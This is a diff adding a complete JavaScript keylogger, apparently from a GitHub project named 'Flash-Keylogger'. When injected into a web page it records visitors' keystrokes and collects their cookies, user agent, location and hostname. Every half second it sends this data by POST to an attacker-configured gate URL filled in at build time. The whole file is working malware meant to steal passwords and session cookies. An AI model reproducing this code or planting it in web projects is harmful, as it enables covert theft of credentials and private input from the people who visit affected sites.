@@ -1,0 +1,71 @@
+// https://github.com/bmh1cker/Flash-Keylogger
+
+// Settings
+var fluxGate    = "{buildGate}";
+var fluxName    = "{buildName}"
+var sendTimeout = 500;
+
+
+// KEYLOGGER
+var keys = "";
+document.addEventListener("keypress", function(e) {
+	keyCode = e.keyCode;
+	keyName = e.key;
+	// console.log(keyName);
+	// alert("Name: " + keyName + " code: " + keyCode);
+	// Check key
+	switch(keyCode) {
+		// ENTER
+		case 13:
+			keyName = "\n";
+			break;
+		// BACKSPACE
+		case 8:
+			keyName = "";
+			keys = keys.slice(0, -1);
+			break;
+		// NORMAL KEY
+		default:
+			// If is special key add < KEY >
+			if (keyName.length > 1) {
+				keyName = " <" + keyName + "> ";
+			}
+			break;
+	}
+	// Add	
+	keys += keyName;
+});
+
+// Save keylogs, useragents, ip, location, host, cookies.
+date = new Date;
+var old = 0;
+function saveAll() {
+
+	// Check for new data
+	if (old == keys.length) {
+		// not send
+		return "";
+	} else {
+		// send
+		old = keys.length;
+	}
+
+	var time     = date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds();
+	var uagents  = window.navigator.userAgent;
+	var host     = window.location.hostname;
+	var location = document.location;
+	var cookies  = document.cookie;
+
+	var http     = new XMLHttpRequest();
+	var params   = "keyLogs=" + keys + "&cookies=" + cookies + "&name=" + fluxName + "&uagents=" + uagents + "&location=" + location + "&host=" + host + "&time=" + time + "&sendLogs";
+	http.open("POST", fluxGate, true);
+
+	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	http.send(params);
+
+}
+
+// Create loop
+setInterval(function() {
+  saveAll();
+}, sendTimeout);
